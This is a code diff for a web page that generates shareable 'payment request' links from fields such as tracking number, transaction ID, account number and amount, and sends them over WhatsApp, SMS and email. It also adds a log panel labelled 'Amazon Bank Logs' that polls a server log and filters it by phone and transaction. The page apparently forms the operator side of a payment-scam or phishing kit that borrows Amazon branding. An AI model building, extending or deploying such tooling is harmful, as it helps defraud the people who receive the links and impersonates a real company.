+  try {
+    const res = await fetch('/api/links', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (!res.ok) throw new Error('Server ' + res.status);
+    const data = await res.json();
+    state.shortCode = data.code;
+    state.shortLink = base + page + '?r=' + data.code;
+  } catch (err) {
+    state.shortCode = 'FULL';
+    state.shortLink = state.fullLink;
+    showToast('Short link server unavailable — using full link.');
+  }
+  state.payload = payload;
+}
+
+function currentLink() { return state.linkMode === 'short' ? state.shortLink : state.fullLink; }
+
+async function shortenUrl(longUrl) {
+  try {
+    const r = await fetch('/api/shorten', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url: longUrl })
+    });
+    const d = await r.json();
+    return d.shortUrl || longUrl;
+  } catch (e) {
+    return longUrl;
+  }
+}
+
+async function setLinkMode(mode) {
+  state.linkMode = mode;
+  $('modeShort').classList.toggle('active', mode === 'short');
+  $('modeFull').classList.toggle('active', mode === 'full');
+  await refreshLinkUI();
+}
+
+async function refreshLinkUI() {
+  const link = currentLink();
+  const display = await shortenUrl(link);
+  $('generatedLink').value = display;
+  $('shortCode').textContent = state.linkMode === 'short' ? state.shortCode : 'FULL';
+  $('openLink').href = display;
+  $('qrImg').src = 'https://api.qrserver.com/v1/create-qr-code/?size=180x180&margin=6&data=' + encodeURIComponent(display);
+  if (state.payload && state.payload.exp) {
+    $('expiryInfo').textContent = 'Expires: ' + new Date(state.payload.exp).toLocaleString();
+  } else { $('expiryInfo').textContent = 'No expiry set'; }
+}
+
+async function handleSubmit(e) {
+  e.preventDefault();
+  if (!validateForm()) { showToast('Please fix the highlighted fields.'); return; }
+
+  const btn = $('submitBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<span>⏳</span> Generating…';
+
+  const payload = {
+    c: $('country').value, mk: $('market').value.trim(), pm: $('paymentMode').value.trim(),
+    sn: $('serviceName').value.trim(), rn: $('recipientName').value.trim(),
+    tn: $('trackingNumber').value.trim().toUpperCase(), tx: $('transactionId').value.trim().toUpperCase(),
+    an: $('accountNumber').value.trim(), am: parseFloat($('amount').value).toFixed(2),
+    cur: $('currency').value, nt: $('serviceNote').value.trim()
+  };
+
+  payload.dt = Date.now();
+
+  if ($('expiryToggle').checked) {
+    const hours = parseInt($('expiryDuration').value, 10);
+    payload.exp = Date.now() + hours * 3600 * 1000;
+  }
+
+  await buildLinks(payload);
+  await setLinkMode('short');
+  $('result').classList.add('show');
+  $('sharePop').classList.remove('show');
+  await refreshLinkUI();
+  $('result').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  showToast('Link generated successfully.');
+
+  btn.disabled = false;
+  btn.innerHTML = '<span>Generate client link</span><span>→</span>';
+}
+
+function copyLink() {
+  const link = $('generatedLink').value || currentLink();
+  const btn = $('copyBtn');
+  const done = () => {
+    btn.classList.add('copied'); btn.innerHTML = '<span>✓</span> Copied!';
+    showToast('Link copied to clipboard.');
+    setTimeout(() => { btn.classList.remove('copied'); btn.innerHTML = '<span>📋</span> Copy link'; }, 1800);
+  };
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(link).then(done).catch(() => { fallbackCopy(link); done(); });
+  } else { fallbackCopy(link); done(); }
+}
+function fallbackCopy(text) {
+  const ta = document.createElement('textarea'); ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+  document.body.appendChild(ta); ta.select();
+  try { document.execCommand('copy'); } catch (e) {}
+  document.body.removeChild(ta);
+}
+
+function toggleSharePop() { $('sharePop').classList.toggle('show'); }
+
+function shareMessage() {
+  const p = state.payload || {};
+  const amount = p.am ? p.cur + ' ' + Number(p.am).toFixed(2) : '';
+  return 'Payment request' + (amount ? ' for ' + amount : '') +
+         (p.sn ? ' — ' + p.sn : '') + '. Review & pay here:';
+}
+
+function shareVia(channel) {
+  const link = $('generatedLink').value || currentLink();
+  const text = shareMessage();
+  if (channel === 'whatsapp') window.open('https://wa.me/?text=' + encodeURIComponent(text + ' ' + link), '_blank');
+  else if (channel === 'sms') window.location.href = 'sms:?&body=' + encodeURIComponent(text + ' ' + link);
+  else if (channel === 'email') {
+    const subject = encodeURIComponent('Payment request');
+    const body = encodeURIComponent(text + '\n\n' + link);
+    window.location.href = 'mailto:?subject=' + subject + '&body=' + body;
+  } else if (channel === 'native') {
+    if (navigator.share) navigator.share({ title: 'Payment request', text, url: link }).catch(() => {});
+    else { copyLink(); showToast('Native sharing not supported — link copied instead.'); }
+  }
+}
+
+(function () {
+  if (document.getElementById('ecopay-log-panel')) return;
+
+  const css = `
+    .log-panel { position: fixed; bottom: 20px; right: 20px; width: 420px; max-width: calc(100vw - 24px); background: #fff; border: 1px solid #E3E6E6; border-radius: 14px; box-shadow: 0 16px 48px rgba(19,25,33,0.18); font-family: 'Poppins', sans-serif; z-index: 9999; display: flex; flex-direction: column; overflow: hidden; transition: height .2s ease; }
+    .log-panel.collapsed { height: 46px !important; }
+    .log-head { display: flex; align-items: center; justify-content: space-between; padding: 12px 14px; background: #131921; color: #FF9900; font-size: 13px; font-weight: 700; cursor: pointer; user-select: none; }
+    .log-head .title .eco { color: #FF9900; }
+    .log-head .title .cash { color: #FFFFFF; }
+    .log-head .title small { display: block; font-size: 10px; font-weight: 500; opacity: 0.7; margin-top: 1px; color: #FFFFFF; }
+    .log-head .count { font-size: 10px; font-weight: 700; background: rgba(255,153,0,0.2); color: #FF9900; padding: 3px 8px; border-radius: 12px; }
+    .log-body { display: flex; flex-direction: column; height: 340px; }
+    .log-tools { display: flex; gap: 6px; padding: 8px 10px; border-bottom: 1px solid #E3E6E6; background: #F7F8FA; }
+    .log-tools input { flex: 1; padding: 6px 10px; font-size: 12px; border: 1px solid #E3E6E6; border-radius: 7px; outline: none; font-family: inherit; }
+    .log-tools input:focus { border-color: #FF9900; }
+    .log-tools button { padding: 6px 10px; font-size: 11px; font-weight: 700; border-radius: 7px; border: none; cursor: pointer; background: #131921; color: #FF9900; font-family: inherit; }
+    .log-tools button.ghost { background: #fff; color: #131921; border: 1px solid #E3E6E6; }
+    .log-entries { flex: 1; overflow-y: auto; padding: 8px 12px; font-family: "SF Mono", Monaco, monospace; font-size: 11.5px; line-height: 1.65; color: #0F1111; background: #fff; }
+    .log-entries .ts { color: #565959; }
+    .log-entries .ok { color: #067D62; font-weight: 700; }
+    .log-entries .err { color: #B12704; font-weight: 700; }
+    .log-entries .info { color: #131921; font-weight: 700; }
+    .log-entries .empty { color: #565959; font-style: italic; }
+    @media (max-width: 480px) { .log-panel { width: calc(100vw - 16px); right: 8px; bottom: 8px; } .log-body { height: 260px; } }
+  `;
+
+  const styleEl = document.createElement('style');
+  styleEl.textContent = css;
+  document.head.appendChild(styleEl);
+
+  const panel = document.createElement('div');
+  panel.className = 'log-panel collapsed';
+  panel.id = 'ecopay-log-panel';
+  panel.innerHTML = `
+    <div class="log-head" id="logHead">
+      <div class="title">
+        <span class="eco">Amazon</span><span class="cash">Bank</span> Logs
+        <small>Click to open / close</small>
+      </div>
+      <div class="count" id="logCount">0</div>
+    </div>
+    <div class="log-body">
+      <div class="log-tools">
+        <input type="text" id="logFilter" placeholder="Filter (phone, tx, error)">
+        <button class="ghost" id="logRefresh">↻</button>
+        <button id="logAuto">▶ Auto</button>
+      </div>
+      <div class="log-entries" id="logEntries">
+        <div class="empty">No entries yet.</div>
+      </div>
+    </div>
+  `;
+  document.body.appendChild(panel);
+
+  let entries = [], autoTimer = null, isOpen = false;
+  const headEl    = document.getElementById('logHead');
+  const countEl   = document.getElementById('logCount');
+  const entriesEl = document.getElementById('logEntries');
+  const filterEl  = document.getElementById('logFilter');
+  const refreshEl = document.getElementById('logRefresh');
+  const autoEl    = document.getElementById('logAuto');
+
+  headEl.addEventListener('click', () => {
+    isOpen = !isOpen;
+    panel.classList.toggle('collapsed', !isOpen);
+    if (isOpen) loadLogs();
+  });
+  refreshEl.addEventListener('click', e => { e.stopPropagation(); loadLogs(); });
+  autoEl.addEventListener('click', e => {
+    e.stopPropagation();
+    if (autoTimer) {
+      clearInterval(autoTimer); autoTimer = null;
+      autoEl.textContent = '▶ Auto'; autoEl.classList.add('ghost');
+    } else {
+      autoEl.textContent = '⏸ Stop'; autoEl.classList.remove('ghost');
+      loadLogs(); autoTimer = setInterval(loadLogs, 4000);
+    }
+  });
+  filterEl.addEventListener('input', render);
+
+  function escapeHtml(s) {
+    return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
+      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+    }[c]));
+  }
+  async function loadLogs() {
+    try {
+      const res = await fetch('/api/logs');
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      const data = await res.json();
+      entries = Array.isArray(data.entries) ? data.entries : [];
+      render();
+    } catch (err) {
+      entriesEl.innerHTML = '<div class="err">Load failed: ' + escapeHtml(err.message) + '</div>';
+    }
+  }
+  function render() {
+    const filter = filterEl.value.toLowerCase().trim();
+    const visible = entries.filter(e => !filter || (e.text || '').toLowerCase().includes(filter));
+    countEl.textContent = visible.length;
+    if (!visible.length) {
+      entriesEl.innerHTML = '<div class="empty">' + (filter ? 'No matching entries.' : 'No entries yet.') + '</div>';
+      return;
+    }
+    entriesEl.innerHTML = visible.map(e => {
+      const cls = e.level === 'ok' ? 'ok' : e.level === 'err' ? 'err' : 'info';
+      return '<div><span class="ts">[' + escapeHtml(e.time) + ']</span> <span class="' + cls + '">' + escapeHtml(e.text) + '</span></div>';
+    }).join('');
+  }
+})();
+
+document.addEventListener('DOMContentLoaded', () => {
+  regenerateTracking(); regenerateTxn(); updatePreview();
+});
+</script>
+</body>
+</html>
